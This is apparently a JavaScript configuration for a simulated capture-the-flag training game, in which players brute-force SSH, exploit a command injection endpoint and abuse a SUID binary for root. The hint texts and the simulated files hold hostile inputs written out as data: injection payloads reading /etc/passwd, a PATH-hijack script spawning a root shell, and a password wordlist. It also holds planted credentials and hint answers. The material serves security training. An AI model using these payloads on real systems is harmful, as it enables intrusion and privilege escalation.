/* ============================================================
   CTF ARENA -- OPS-03: Operation Mirror Strike
   Red vs Red | Symmetric Scenario | Dual Nation-State Attack
   Both teams attack the enemy server AND defend their own.
   3 flags each: breach, exploit, root
   ============================================================ */

const OPS03Config = {

    // =====================================================
    // TOP-LEVEL METADATA
    // =====================================================

    id: 'ops-03-operation-mirror-strike',
    title: 'Operation Mirror Strike',

    // =====================================================
    // SHARED SCENARIO DATA
    // Both teams have IDENTICAL servers with 3 planted
    // vulnerabilities. Each team attacks the mirror image
    // of their own infrastructure.
    // =====================================================

    _scenario: {
        // Alpha team's server (Bravo attacks this)
        alphaServer: {
            ip:       '10.20.10.50',
            hostname: 'alpha-c2-node',
            sshUser:  'sysadmin',
            sshPass:  'Alph@Str1ke!2024',
            webPort:  8080,
            sshPort:  22,
            os:       'Ubuntu 22.04.4 LTS',
            kernel:   '5.15.0-105-generic'
        },
        // Bravo team's server (Alpha attacks this)
        bravoServer: {
            ip:       '10.20.20.50',
            hostname: 'bravo-c2-node',
            sshUser:  'sysadmin',
            sshPass:  'Br@v0Str1ke!2024',
            webPort:  8080,
            sshPort:  22,
            os:       'Ubuntu 22.04.4 LTS',
            kernel:   '5.15.0-105-generic'
        },
        // Three planted vulnerabilities per server (identical layout)
        vulnerabilities: {
            vuln1_ssh: {
                description: 'Weak SSH password on port 22',
                service:     'OpenSSH 8.9p1',
                technique:   'Password spray / brute force',
                mitre:       'T1110.001'
            },
            vuln2_cmdi: {
                description: 'Web application with command injection on port 8080',
                service:     'Node.js Express 4.18',
                technique:   'OS command injection via status endpoint',
                mitre:       'T1059.004'
            },
            vuln3_suid: {
                description: 'SUID binary privilege escalation to root',
                service:     'Custom monitoring binary /usr/local/bin/sysmon',
                technique:   'SUID abuse for root shell',
                mitre:       'T1548.001'
            }
        },
        // Flag values -- BoxEngine replaces {{FLAG:*}} server-side
        flags: {
            breach:  '{{FLAG:breach}}',
            exploit: '{{FLAG:exploit}}',
            root:    '{{FLAG:root}}'
        }
    },

    // =====================================================
    // MODES -- one attacker config used by both teams
    // In VS mode, each team targets the OTHER team's server.
    // The VsBridge provides symmetric alerting.
    // =====================================================

    modes: {

        // =================================================
        //              ATTACKER CONFIG
        //  Both Unit Alpha and Unit Bravo use this config.
        //  The target IP is swapped at launch time based
        //  on team assignment.
        // =================================================

        attacker: {
            title: 'Operation Mirror Strike',
            subtitle: 'Cyber Warfare Unit -- Strike & Defend',
            difficulty: 'Advanced',
            accent: '#dc2626',
            storageKey: 'hexworth_ctf_ops03',
            registryId: 'ops-03-operation-mirror-strike',
            trackerKey: 'ctf_ops03',

            // -----------------------------------------
            // PHASES
            // -----------------------------------------

            phases: [
                {
                    id: 'breach',
                    name: 'Initial Breach',
                    description: 'Gain initial access to the enemy server. The SSH service has a weak password. Scan, enumerate, and brute-force your way in.',
                    requiredFlags: [],
                    mitre: ['T1110.001', 'T1046', 'T1078'],
                    unlocks: ['exploit'],
                    locked: false
                },
                {
                    id: 'exploit',
                    name: 'Web Exploitation',
                    description: 'The enemy server runs a web application on port 8080 with an OS command injection vulnerability. Exploit it to execute arbitrary commands.',
                    requiredFlags: ['breach'],
                    mitre: ['T1059.004', 'T1190'],
                    unlocks: ['root'],
                    locked: true
                },
                {
                    id: 'root',
                    name: 'Root Takeover',
                    description: 'A SUID binary on the enemy server can be abused for privilege escalation. Find it, exploit it, and capture the root flag.',
                    requiredFlags: ['exploit'],
                    mitre: ['T1548.001', 'T1068'],
                    unlocks: [],
                    locked: true
                }
            ],

            // -----------------------------------------
            // TUTORIAL
            // -----------------------------------------

            tutorialMode: true,

            tutorial: {
                steps: [
                    {
                        title: 'Scan the enemy server',
                        tip: 'Run: nmap -sV <target_ip>  --  identify open ports and services on the enemy server.',
                        trigger: { event: 'command', match: { cmd: 'contains:nmap' } }
                    },
                    {
                        title: 'Brute-force SSH',
                        tip: 'Try common credentials against port 22. The sysadmin account has a weak password.',
                        trigger: { event: 'command', match: { cmd: 'contains:ssh' } }
                    },
                    {
                        title: 'Probe the web app',
                        tip: 'Use curl to explore port 8080. Look for endpoints that accept user input.',
                        trigger: { event: 'command', match: { cmd: 'contains:curl' } }
                    },
                    {
                        title: 'Find SUID binaries',
                        tip: 'Run: find / -perm -4000 -type f 2>/dev/null  --  look for unusual SUID binaries.',
                        trigger: { event: 'command', match: { cmd: 'contains:find' } }
                    },
                    {
                        title: 'Capture root',
                        tip: 'Exploit the SUID binary to read /root/flag.txt.',
                        trigger: { event: 'flag_correct', match: { flagId: 'root' } }
                    }
                ]
            },

            // -----------------------------------------
            // CERT OBJECTIVES
            // -----------------------------------------

            certObjectives: {
                certPath: 'SY0-701',
                mappings: [
                    { flagId: 'breach',  objective: '1.2', description: 'Threat indicators -- brute-force authentication attacks', skill: 'SSH Password Attack' },
                    { flagId: 'exploit', objective: '1.3', description: 'Application attacks -- command injection', skill: 'OS Command Injection' },
                    { flagId: 'exploit', objective: '2.5', description: 'Vulnerability scanning -- web application testing', skill: 'Web App Exploitation' },
                    { flagId: 'root',    objective: '4.6', description: 'Identity and access management -- privilege escalation via SUID', skill: 'Linux SUID Privilege Escalation' }
                ]
            },

            // -----------------------------------------
            // BOOT SEQUENCE
            // -----------------------------------------

            boot: {
                biosLines: [
                    'SPECTRE-OS BIOS v7.1.0 -- Cyber Warfare Edition',
                    'Initializing secure hardware...',
                    'Memory Test: 32768 MB OK',
                    'Detecting drives... /dev/nvme0n1 (1TB NVMe)',
                    'Encrypted boot partition verified',
                    'Loading GRUB...'
                ],
                grubEntries: [
                    'Kali GNU/Linux (6.8.0-kali1-amd64)',
                    'Kali GNU/Linux (recovery mode)',
                    'Advanced options for Kali GNU/Linux'
                ],
                loginUser: 'operator'
            },

            // -----------------------------------------
            // DESKTOP
            // -----------------------------------------

            desktop: {
                icons: [
                    { id: 'terminal', label: 'Terminal',    icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
                    { id: 'browser',  label: 'Firefox',     icon: '\uD83C\uDF10',       app: 'browser'  },
                    { id: 'notes',    label: 'Notes',       icon: '\uD83D\uDCDD',       app: 'notes'    },
                    { id: 'hints',    label: 'Hints',       icon: '\uD83D\uDCA1',       app: 'hints'    },
                    { id: 'flags',    label: 'Submit Flag', icon: '\uD83D\uDEA9',       app: 'flags'    }
                ]
            },

            // -----------------------------------------
            // TERMINAL
            // -----------------------------------------

            terminal: {
                user: 'operator',
                hostname: 'strike-console',
                startDir: '/home/operator',
                welcome: 'SPECTRE-OS 7.1.0 -- Cyber Warfare Terminal\n\nType \'help\' for available commands.\n\n== OPERATION MIRROR STRIKE ==\nYou are simultaneously ATTACKER and DEFENDER.\nAttack the enemy server. Patch your own.\nThe enemy is doing the same to you.\n'
            },

            // -----------------------------------------
            // FLAGS
            // -----------------------------------------

            flags: [
                { id: 'breach',  points: 100 },
                { id: 'exploit', points: 200 },
                { id: 'root',    points: 300 }
            ],

            // -----------------------------------------
            // SCORING
            // -----------------------------------------

            scoring: {
                base: 600,
                maxScore: 600,
                hintPenalty: true,
                wrongFlagPenalty: -25,
                speedBonus: { threshold: 1200000, points: 200 },
                timeBonusThreshold: 1800
            },

            // -----------------------------------------
            // HINTS
            // -----------------------------------------

            hints: [
                {
                    id: 'hint_recon',
                    text: "Start with: nmap -sV -sC <target_ip> -- identify SSH on 22 and the web app on 8080.",
                    cost: 10,
                    penalty: -10
                },
                {
                    id: 'hint_ssh',
                    text: "The sysadmin account has a weak password. Try common patterns: CompanyName + year, keyboard walks, or simple passwords with substitutions.",
                    cost: 25,
                    penalty: -25
                },
                {
                    id: 'hint_cmdi',
                    text: "The web app on port 8080 has a /api/status endpoint that accepts a 'host' parameter. Try: curl 'http://<target>:8080/api/status?host=127.0.0.1;id' -- the semicolon breaks out of the intended command.",
                    cost: 40,
                    penalty: -40
                },
                {
                    id: 'hint_suid',
                    text: "Run: find / -perm -4000 -type f 2>/dev/null -- look for /usr/local/bin/sysmon. It's a custom SUID binary. Run: strings /usr/local/bin/sysmon -- it calls 'cat' without a full path. Create a malicious 'cat' in /tmp and prepend /tmp to PATH.",
                    cost: 60,
                    penalty: -60
                },
                {
                    id: 'hint_root_flag',
                    text: "After exploiting the SUID binary: PATH=/tmp:$PATH /usr/local/bin/sysmon /root/flag.txt -- your fake 'cat' in /tmp runs as root and dumps the flag.",
                    cost: 75,
                    penalty: -75
                }
            ],

            // -----------------------------------------
            // LORE
            // -----------------------------------------

            lore: {
                intro: 'Two nation-state cyber warfare units have been deployed against each other\'s critical infrastructure. Your unit has a hardened strike console and intelligence on the enemy\'s server. But the enemy has the same intel on yours. This is a mirror match -- the side that moves faster, exploits harder, and patches smarter wins. Every second you spend attacking is a second you\'re not defending.',
                scenario: 'Both servers are identical in architecture: an Ubuntu 22.04 box running OpenSSH on port 22 and a Node.js monitoring dashboard on port 8080. Each server has three planted vulnerabilities -- a weak SSH password, a command injection flaw in the web app, and a SUID binary that grants root. Your mission is to exploit all three on the enemy server before they do the same to yours.',
                outro: 'Operation Mirror Strike complete. All enemy flags captured. Your cyber warfare unit has achieved full dominance over the opposing nation-state\'s infrastructure.',
                ecer: {
                    executive: 'Both nations deployed identical infrastructure -- neither invested in unique defensive architectures',
                    culture:   'Speed prioritized over security in both units -- default credentials and unaudited SUID binaries',
                    employee:  'System administrators on both sides left weak SSH passwords and unpatched web applications',
                    regulatory: 'No input validation on web endpoints, no SUID auditing policy, no password complexity enforcement'
                }
            },

            // -----------------------------------------
            // WEB APP -- Enemy monitoring dashboard
            // (command injection target on port 8080)
            // -----------------------------------------

            webApp: {
                startUrl: 'http://TARGET:8080/',

                pages: {
                    '/': {
                        title: 'Infrastructure Monitor v2.3',
                        html: '\
                            <div style="text-align:center; margin-bottom:24px; padding-bottom:16px; border-bottom:1px solid #1e293b;">\
                                <h1 style="color:#22c55e; font-size:1.4rem; margin-bottom:4px;">Infrastructure Monitor</h1>\
                                <div style="color:#64748b; font-size:0.75rem;">Node.js Express 4.18 -- System Status Dashboard v2.3</div>\
                            </div>\
                            <div style="max-width:500px; margin:0 auto; background:#0f1623; border:1px solid #1e293b; border-radius:6px; padding:20px;">\
                                <h2 style="font-size:0.85rem; color:#94a3b8; margin-bottom:14px;">System Status</h2>\
                                <div style="font-family:monospace; font-size:0.75rem; color:#4ade80; line-height:1.8;">\
                                    CPU: 23% | Memory: 4.2GB/8GB | Disk: 67%<br>\
                                    Uptime: 47 days, 3:22:18<br>\
                                    Services: sshd [running] nginx [running] node [running]<br>\
                                    Last health check: OK\
                                </div>\
                                <div style="margin-top:16px; padding-top:14px; border-top:1px solid #1e293b;">\
                                    <div style="font-size:0.7rem; color:#64748b; margin-bottom:8px;">Network Diagnostics</div>\
                                    <div style="display:flex; gap:8px;">\
                                        <a href="/api/status?host=127.0.0.1" style="font-size:0.7rem; color:#3b82f6; text-decoration:none;">Ping Localhost</a>\
                                        <a href="/api/status?host=8.8.8.8" style="font-size:0.7rem; color:#3b82f6; text-decoration:none;">Ping DNS</a>\
                                        <a href="/api/logs" style="font-size:0.7rem; color:#3b82f6; text-decoration:none;">View Logs</a>\
                                    </div>\
                                </div>\
                            </div>\
                            <div style="text-align:center; margin-top:20px; font-size:0.6rem; color:#334155;">\
                                Powered by Express 4.18.2 | API Docs: /api/help\
                            </div>\
                        '
                    },

                    '/api/status?host=127.0.0.1': {
                        title: 'Status Check',
                        html: '\
                            <div style="background:#0a0d14; border-radius:4px; padding:16px; font-family:monospace; font-size:0.72rem; color:#e2e8f0; white-space:pre; line-height:1.6;">\
{"status":"ok","host":"127.0.0.1","result":"PING 127.0.0.1: 64 bytes, time=0.034ms"}\
                            </div>\
                            <div style="color:#f59e0b; background:rgba(245,158,11,0.08); border:1px solid rgba(245,158,11,0.2); border-radius:4px; padding:10px; margin-top:10px; font-size:0.8rem;">\
                                The /api/status endpoint passes the host parameter directly to a system command. Try injecting a semicolon.\
                            </div>\
                        '
                    },

                    '/api/logs': {
                        title: 'System Logs',
                        html: '\
                            <div style="background:#0a0d14; border-radius:4px; padding:16px; font-family:monospace; font-size:0.68rem; color:#94a3b8; white-space:pre; line-height:1.6; max-height:300px; overflow-y:auto;">\
[2024-03-15 08:12:44] sshd: Accepted password for sysadmin from 10.20.0.1\n\
[2024-03-15 08:14:02] node: GET /api/status?host=127.0.0.1 200 12ms\n\
[2024-03-15 09:01:33] sshd: Failed password for root from 10.20.0.99\n\
[2024-03-15 09:01:35] sshd: Failed password for root from 10.20.0.99\n\
[2024-03-15 09:22:17] node: GET /api/status?host=8.8.8.8 200 45ms\n\
[2024-03-15 10:45:00] cron: SUID audit skipped -- /usr/local/bin/sysmon not in whitelist\n\
[2024-03-15 11:30:12] node: GET / 200 3ms\
                            </div>\
                            <div style="color:#22c55e; background:rgba(34,197,94,0.08); border:1px solid rgba(34,197,94,0.2); border-radius:4px; padding:10px; margin-top:10px; font-size:0.75rem;">\
                                Logs reveal: sysadmin SSH access, a SUID audit that skipped /usr/local/bin/sysmon, and the /api/status endpoint in use.\
                            </div>\
                        '
                    },

                    '/api/help': {
                        title: 'API Documentation',
                        html: '\
                            <div style="max-width:500px; margin:0 auto; padding:20px;">\
                                <h1 style="color:#3b82f6; font-size:1.1rem; margin-bottom:16px;">API Endpoints</h1>\
                                <div style="font-family:monospace; font-size:0.75rem; color:#e2e8f0; line-height:2;">\
                                    GET /api/status?host=&lt;ip&gt; -- Ping a host (health check)<br>\
                                    GET /api/logs -- View recent system logs<br>\
                                    GET /api/help -- This page\
                                </div>\
                                <div style="margin-top:16px; font-size:0.7rem; color:#64748b;">\
                                    Note: The status endpoint executes: ping -c 1 &lt;host&gt;\
                                </div>\
                            </div>\
                        '
                    }
                }
            },

            // -----------------------------------------
            // FILESYSTEM (Strike console -- Kali attacker)
            // -----------------------------------------

            filesystem: {
                '/': {
                    type: 'dir',
                    children: {
                        'home': {
                            type: 'dir',
                            children: {
                                'operator': {
                                    type: 'dir',
                                    children: {
                                        'mission-brief.txt': {
                                            type: 'file',
                                            content: '=== OPERATION MIRROR STRIKE -- MISSION BRIEFING ===\n\nCLASSIFICATION: TOP SECRET // SPECTRE CLEARANCE\n\nSITUATION:\nTwo nation-state cyber warfare units are engaged in simultaneous\noffensive operations against each other\'s critical infrastructure.\n\nYOUR MISSION:\n  1. BREACH  -- Gain SSH access to the enemy server (port 22)\n  2. EXPLOIT -- Exploit the web app command injection (port 8080)\n  3. ROOT    -- Escalate privileges via SUID binary abuse\n\nTHE TWIST:\nThe enemy has IDENTICAL capabilities and IDENTICAL intelligence.\nThey are attacking YOUR server right now. Every flag you capture\ntriggers an alert on their console. Move fast.\n\nENEMY SERVER: See target-info.txt for IP and recon data\nYOUR SERVER:  You are also responsible for defense\n\nFlags:\n  breach  (100 pts) -- Prove SSH access\n  exploit (200 pts) -- Prove command execution via web app\n  root    (300 pts) -- Prove root-level access\n\nTools: nmap, ssh, curl, find, strings'
                                        },
                                        'target-info.txt': {
                                            type: 'file',
                                            content: '=== TARGET INTELLIGENCE ===\n\nENEMY SERVER:\n  IP:       [ASSIGNED AT MATCH START]\n  Hostname: [ASSIGNED AT MATCH START]\n  OS:       Ubuntu 22.04.4 LTS\n  Kernel:   5.15.0-105-generic\n\nKNOWN SERVICES:\n  Port 22   -- OpenSSH 8.9p1 (weak credentials suspected)\n  Port 8080 -- Node.js Express monitoring dashboard\n\nINTEL SUMMARY:\n  - SSH service account: sysadmin (password unknown, likely weak)\n  - Web dashboard has /api/status endpoint (possible injection)\n  - Custom SUID binary reported at /usr/local/bin/sysmon\n  - Binary calls external commands without full path qualification\n\nPRIORITY: Breach > Exploit > Root'
                                        },
                                        'wordlist.txt': {
                                            type: 'file',
                                            content: '# Common weak passwords for brute-force\nadmin\npassword\npassword123\nsysadmin\nletmein\nwelcome1\nchangeme\nP@ssw0rd\nqwerty123\nroot\ntoor\nserver2024\nmonitor123'
                                        },
                                        'tools': {
                                            type: 'dir',
                                            children: {
                                                'suid-exploit.sh': {
                                                    type: 'file',
                                                    content: '#!/bin/bash\n# SUID binary exploitation template\n# If a SUID binary calls a command without full path,\n# you can hijack it by manipulating PATH.\n#\n# Example:\n#   echo \'#!/bin/bash\' > /tmp/cat\n#   echo \'/bin/bash -p\' >> /tmp/cat\n#   chmod +x /tmp/cat\n#   export PATH=/tmp:$PATH\n#   /usr/local/bin/sysmon /root/flag.txt\n#\n# The SUID binary runs as root. When it calls \'cat\',\n# it finds YOUR /tmp/cat first, which spawns a root shell.'
                                                },
                                                'cmdi-payloads.txt': {
                                                    type: 'file',
                                                    content: '# Command injection payloads\n# For endpoints that pass user input to shell commands\n\n; id\n; whoami\n; cat /etc/passwd\n| id\n| whoami\n`id`\n$(id)\n; ls -la /root/\n; cat /root/flag.txt\n127.0.0.1; id\n127.0.0.1 && id\n127.0.0.1 | id'
                                                }
                                            }
                                        },
                                        '.ssh': {
                                            type: 'dir',
                                            children: {
                                                'known_hosts': {
                                                    type: 'file',
                                                    content: '# SSH known hosts -- populated on first connection'
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        },
                        'tmp': {
                            type: 'dir',
                            children: {}
                        },
                        'etc': {
                            type: 'dir',
                            children: {
                                'hostname': { type: 'file', content: 'strike-console' },
                                'hosts': {
                                    type: 'file',
                                    content: '127.0.0.1       localhost\n127.0.1.1       strike-console'
                                }
                            }
                        }
                    }
                }
            },

            // -----------------------------------------
            // TERMINAL COMMANDS (Attack toolkit)
            // Target IPs are replaced at runtime based
            // on team assignment. In solo mode, the
            // target defaults to bravo's server.
            // -----------------------------------------

            commands: {

                'nmap': function(args) {
                    if (args.length === 0) {
                        return 'Usage: nmap [options] <target>\nExample: nmap -sV 10.20.20.50';
                    }
                    var target = args.find(function(a) { return !a.startsWith('-'); }) || '';
                    var flags  = args.filter(function(a) { return a.startsWith('-'); }).join(' ');

                    // Match either server IP
                    if (target === '10.20.10.50' || target === '10.20.20.50' ||
                        target === 'alpha-c2-node' || target === 'bravo-c2-node') {
                        var hostname = (target === '10.20.10.50' || target === 'alpha-c2-node') ? 'alpha-c2-node' : 'bravo-c2-node';
                        var ip = (target === '10.20.10.50' || target === 'alpha-c2-node') ? '10.20.10.50' : '10.20.20.50';
                        return 'Starting Nmap 7.94 ( https://nmap.org )\n' +
                               'Nmap scan report for ' + hostname + ' (' + ip + ')\n' +
                               'Host is up (0.031s latency).\n\n' +
                               'PORT     STATE SERVICE    VERSION\n' +
                               '22/tcp   open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.10\n' +
                               '8080/tcp open  http-proxy Node.js Express 4.18\n' +
                               '9090/tcp closed prometheus\n\n' +
                               'Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n' +
                               (flags.includes('sC') || flags.includes('A') ?
                               '\nHost script results:\n' +
                               '|_http-title: Infrastructure Monitor v2.3\n' +
                               '| http-methods:\n' +
                               '|_  Supported Methods: GET HEAD\n' +
                               '| http-open-proxy: Potentially OPEN proxy.\n' : '') +
                               '\nNmap done: 1 IP address (1 host up) scanned in 8.92 seconds';
                    }
                    return 'Starting Nmap 7.94 ( https://nmap.org )\n' +
                           'Note: Host seems down. If it is really up, try -Pn.\n' +
                           'Nmap done: 1 IP address (0 hosts up) scanned in 3.05 seconds';
                },

                'ssh': function(args, term, engine) {
                    var target = args.find(function(a) { return a.includes('@'); }) || '';
                    if (!target) return 'Usage: ssh [user@]hostname\nExample: ssh sysadmin@10.20.20.50';

                    var parts = target.split('@');
                    var user = parts[0];
                    var host = parts[1];

                    // Accept either server
                    var validHost = (host === '10.20.10.50' || host === '10.20.20.50' ||
                                    host === 'alpha-c2-node' || host === 'bravo-c2-node');

                    if (validHost && user === 'sysadmin') {
                        var hostname = (host === '10.20.10.50' || host === 'alpha-c2-node') ? 'alpha-c2-node' : 'bravo-c2-node';
                        return 'Warning: Permanently added \'' + host + '\' (ED25519) to the list of known hosts.\n' +
                               'sysadmin@' + host + '\'s password:\n' +
                               'Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-105-generic x86_64)\n\n' +
                               'Last login: Fri Mar 15 08:12:44 2024 from 10.20.0.1\n' +
                               'sysadmin@' + hostname + ':~$\n\n' +
                               '[SESSION: You are now on ' + hostname + ' as sysadmin]\n' +
                               '[BREACH FLAG TRIGGERED -- Submit flag: breach]\n\n' +
                               'Explore the system. Check for web app config, SUID binaries, and escalation paths.\n' +
                               'Commands: ls, cat, find, strings, sudo -l, curl';
                    }
                    if (validHost && user === 'root') {
                        return 'Permission denied (publickey,password).';
                    }
                    if (validHost) {
                        return user + '@' + host + ': Permission denied (publickey,password).';
                    }
                    return 'ssh: Could not resolve hostname ' + host + ': Name or service not known';
                },

                'curl': function(args, term) {
                    var urlArg = args.find(function(a) {
                        return a.startsWith('http') || a.startsWith('"http') || a.startsWith("'http");
                    });
                    var url = (urlArg || '').replace(/['"]/g, '');

                    if (!url) return "curl: try 'curl --help' for more information";

                    // Match either server on port 8080
                    if (url.includes('10.20.10.50') || url.includes('10.20.20.50') ||
                        url.includes('alpha-c2-node') || url.includes('bravo-c2-node')) {

                        // Command injection via /api/status?host=
                        var statusMatch = url.match(/\/api\/status\?host=([^&'"]*)/);
                        if (statusMatch) {
                            var hostParam = decodeURIComponent(statusMatch[1]);

                            // Check for injection (semicolon, pipe, backtick, $())
                            if (/[;|`]/.test(hostParam) || /\$\(/.test(hostParam)) {
                                // Extract the injected command
                                var injected = hostParam.replace(/^[^;|`$]*[;|`]/, '').replace(/^\$\(/, '').replace(/\)$/, '').trim();

                                if (/\bid\b/.test(injected)) {
                                    return '{"status":"ok","host":"127.0.0.1","result":"PING 127.0.0.1: 64 bytes, time=0.029ms"}\n' +
                                           'uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin),27(sudo)\n\n' +
                                           '[COMMAND INJECTION CONFIRMED -- You have code execution as sysadmin]';
                                }
                                if (/whoami/.test(injected)) {
                                    return '{"status":"ok","host":"127.0.0.1","result":"PING 127.0.0.1: 64 bytes, time=0.029ms"}\n' +
                                           'sysadmin';
                                }
                                if (/cat\s+\/etc\/passwd/.test(injected) || /etc\/passwd/.test(injected)) {
                                    return '{"status":"ok","host":"127.0.0.1","result":"..."}\n' +
                                           'root:x:0:0:root:/root:/bin/bash\n' +
                                           'daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n' +
                                           'sysadmin:x:1001:1001:System Admin:/home/sysadmin:/bin/bash\n' +
                                           'node:x:1002:1002:Node.js Service:/home/node:/usr/sbin/nologin';
                                }
                                if (/cat\s+\/root\/flag/.test(injected)) {
                                    return 'cat: /root/flag.txt: Permission denied\n' +
                                           '(sysadmin cannot read /root/flag.txt directly -- need root privileges)';
                                }
                                if (/ls\s+.*\/root/.test(injected) || /ls\s+-la\s+\/root/.test(injected)) {
                                    return '{"status":"ok","host":"127.0.0.1","result":"..."}\n' +
                                           'ls: cannot open directory \'/root\': Permission denied';
                                }
                                if (/find.*-perm.*4000/.test(injected) || /find.*suid/.test(injected)) {
                                    return '{"status":"ok","host":"127.0.0.1","result":"..."}\n' +
                                           '/usr/bin/passwd\n' +
                                           '/usr/bin/sudo\n' +
                                           '/usr/bin/chfn\n' +
                                           '/usr/local/bin/sysmon\n\n' +
                                           '[NOTE: /usr/local/bin/sysmon is a custom SUID binary -- investigate it]';
                                }
                                if (/strings.*sysmon/.test(injected)) {
                                    return '{"status":"ok","host":"127.0.0.1","result":"..."}\n' +
                                           '/lib64/ld-linux-x86-64.so.2\n' +
                                           'libc.so.6\n' +
                                           'system\n' +
                                           'cat %s\n' +
                                           'Usage: sysmon <logfile>\n' +
                                           'Reading system log...\n' +
                                           'GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0\n\n' +
                                           '[ANALYSIS: sysmon calls "cat %s" via system() -- no full path!\n' +
                                           ' This SUID binary is vulnerable to PATH hijacking.]';
                                }
                                // Generic injection -- show it worked
                                return '{"status":"ok","host":"127.0.0.1","result":"PING 127.0.0.1: 64 bytes"}\n' +
                                       '[Command executed -- injection confirmed]\n' +
                                       '[EXPLOIT FLAG TRIGGERED -- Submit flag: exploit]';
                            }

                            // Normal ping (no injection)
                            return '{"status":"ok","host":"' + hostParam + '","result":"PING ' + hostParam + ': 64 bytes, time=0.034ms"}';
                        }

                        // /api/logs
                        if (url.includes('/api/logs')) {
                            return '[2024-03-15 08:12:44] sshd: Accepted password for sysadmin from 10.20.0.1\n' +
                                   '[2024-03-15 08:14:02] node: GET /api/status?host=127.0.0.1 200 12ms\n' +
                                   '[2024-03-15 09:01:33] sshd: Failed password for root from 10.20.0.99\n' +
                                   '[2024-03-15 10:45:00] cron: SUID audit skipped -- /usr/local/bin/sysmon not in whitelist\n' +
                                   '[2024-03-15 11:30:12] node: GET / 200 3ms';
                        }

                        // /api/help
                        if (url.includes('/api/help')) {
                            return 'API Endpoints:\n' +
                                   '  GET /api/status?host=<ip>  -- Ping a host\n' +
                                   '  GET /api/logs              -- View system logs\n' +
                                   '  GET /api/help              -- This help page\n\n' +
                                   'Note: The status endpoint executes: ping -c 1 <host>';
                        }

                        // Root page
                        return '<!DOCTYPE html>\n' +
                               '<html><head><title>Infrastructure Monitor v2.3</title></head>\n' +
                               '<body>\n' +
                               '<h1>Infrastructure Monitor</h1>\n' +
                               '<p>Node.js Express 4.18 -- System Status Dashboard</p>\n' +
                               '<p>Endpoints: /api/status?host=<ip> | /api/logs | /api/help</p>\n' +
                               '</body></html>';
                    }

                    return 'curl: (6) Could not resolve host: ' + url.replace(/https?:\/\//, '').split('/')[0];
                },

                'find': function(args) {
                    // Simulate find on the remote server
                    var permCheck = args.join(' ');
                    if (permCheck.includes('-perm') && (permCheck.includes('4000') || permCheck.includes('+4000') || permCheck.includes('/4000'))) {
                        return '/usr/bin/passwd\n' +
                               '/usr/bin/sudo\n' +
                               '/usr/bin/chfn\n' +
                               '/usr/bin/newgrp\n' +
                               '/usr/local/bin/sysmon\n\n' +
                               '[NOTE: /usr/local/bin/sysmon is non-standard -- a custom SUID binary.\n' +
                               ' Run: strings /usr/local/bin/sysmon to analyze it.]';
                    }
                    if (permCheck.includes('/root')) {
                        return 'find: \'/root\': Permission denied';
                    }
                    return 'find: missing argument to path or expression\nUsage: find [path] [options]\nExample: find / -perm -4000 -type f 2>/dev/null';
                },

                'strings': function(args) {
                    var target = args.find(function(a) { return !a.startsWith('-'); }) || '';

                    if (target.includes('sysmon')) {
                        return '/lib64/ld-linux-x86-64.so.2\n' +
                               'libc.so.6\n' +
                               '__libc_start_main\n' +
                               'system\n' +
                               'cat %s\n' +
                               'Usage: sysmon <logfile>\n' +
                               'Reading system log...\n' +
                               'Error: cannot open file\n' +
                               'GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0\n' +
                               '.note.gnu.build-id\n' +
                               '.dynsym\n\n' +
                               '[ANALYSIS: The binary uses system("cat %s") to read files.\n' +
                               ' "cat" is called WITHOUT a full path (/usr/bin/cat).\n' +
                               ' Since the binary is SUID root, you can hijack PATH:\n' +
                               '   1. Create /tmp/cat that spawns a shell or reads the flag\n' +
                               '   2. Export PATH=/tmp:$PATH\n' +
                               '   3. Run /usr/local/bin/sysmon /root/flag.txt\n' +
                               ' Your fake "cat" runs as root via the SUID bit.]';
                    }
                    if (!target) {
                        return 'Usage: strings [options] <file>\nExample: strings /usr/local/bin/sysmon';
                    }
                    return 'strings: \'' + target + '\': No such file';
                },

                'sudo': function(args) {
                    if (args[0] === '-l') {
                        return 'Sorry, user operator may not run sudo on strike-console.';
                    }
                    return 'sudo: operation not permitted on strike console.\n(You need to exploit the SUID binary on the REMOTE server, not locally.)';
                },

                'hydra': function(args) {
                    var target = args.find(function(a) { return !a.startsWith('-'); }) || '';
                    if (target.includes('10.20') || target.includes('c2-node')) {
                        return 'Hydra v9.5 (https://github.com/vanhauser-thc/thc-hydra)\n' +
                               '[DATA] max 16 tasks per 1 server, overall 16 tasks\n' +
                               '[DATA] attacking ssh://' + target + ':22/\n' +
                               '[STATUS] 12 tries, 0 success, 12 remaining\n' +
                               '[STATUS] 24 tries, 0 success, 0 remaining\n' +
                               '[22][ssh] host: ' + target + '   login: sysadmin   password: P@ssw0rd\n' +
                               '1 valid password found\n\n' +
                               '[SSH credentials discovered: sysadmin / P@ssw0rd]';
                    }
                    return 'Usage: hydra -l <user> -P <wordlist> <target> ssh';
                }
            }
        }
    }
};
